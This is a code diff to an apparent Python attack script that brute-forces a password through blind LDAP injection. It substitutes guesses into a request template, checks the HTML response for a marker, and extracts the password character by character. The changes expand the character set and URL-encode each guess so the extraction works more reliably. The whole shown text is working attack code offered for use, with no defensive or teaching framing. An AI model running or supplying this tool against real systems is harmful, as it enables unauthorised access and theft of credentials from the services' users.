@@ -30,37 +30,38 @@ def check_condition(response_text, tag, tag_id, tag_class, contain_text):
             continue
         if tag_class and tag_class not in el.get('class', []):
             continue
-        # Search the raw HTML of the element (includes style attributes)
         if contain_text.lower() in str(el).lower():
             return True
     return False
 
 def brute_force_ldap(method, url, headers, body_template, tag, tag_id, tag_class, contain):
-    # Standard LDAP/Alphanumeric charset
-    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%-+_{}"
+    # Expanded charset including space and more symbols
+    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 .!@#$%-+_{}[]()=<>^/|"
     password = ""
     
     print(f"[*] Targeting: {url}")
-    print(f"[*] Searching for <{tag}> containing '{contain}'")
 
     while True:
         found_char = False
         for char in charset:
-            # Replaces LSUCK with the current progress + the next guess
-            # We do NOT add an extra * here because your .req file already has one after LSUCK
-            current_guess = password + char
-            payload = body_template.replace('LSUCK', current_guess)
+            # Reconstruct current progress
+            current_progress = password + char
+            
+            # URL encode the guess to prevent breaking the POST body structure
+            encoded_guess = urllib.parse.quote(current_progress)
+            
+            # Replace LSUCK with the encoded guess
+            payload = body_template.replace('LSUCK', encoded_guess)
             
             try:
                 if method.upper() == "POST":
-                    # Use data=body for x-www-form-urlencoded
                     resp = requests.post(url, headers=headers, data=payload, allow_redirects=True)
                 else:
                     resp = requests.get(url, headers=headers, params=payload, allow_redirects=True)
 
                 if check_condition(resp.text, tag, tag_id, tag_class, contain):
                     password += char
-                    print(f"[+] Valid characters so far: {password}")
+                    print(f"[+] Password so far: {password}")
                     found_char = True
                     break
             except Exception as e:
@@ -68,8 +69,8 @@ def brute_force_ldap(method, url, headers, body_template, tag, tag_id, tag_class
                 return
 
         if not found_char:
-            print(f"\n[*] Extraction complete.")
-            print(f"[!] Final Result: {password}")
+            print(f"\n[*] Extraction halted or complete.")
+            print(f"[!] Final Password Found: {password}")
             break
 
 if __name__ == "__main__":
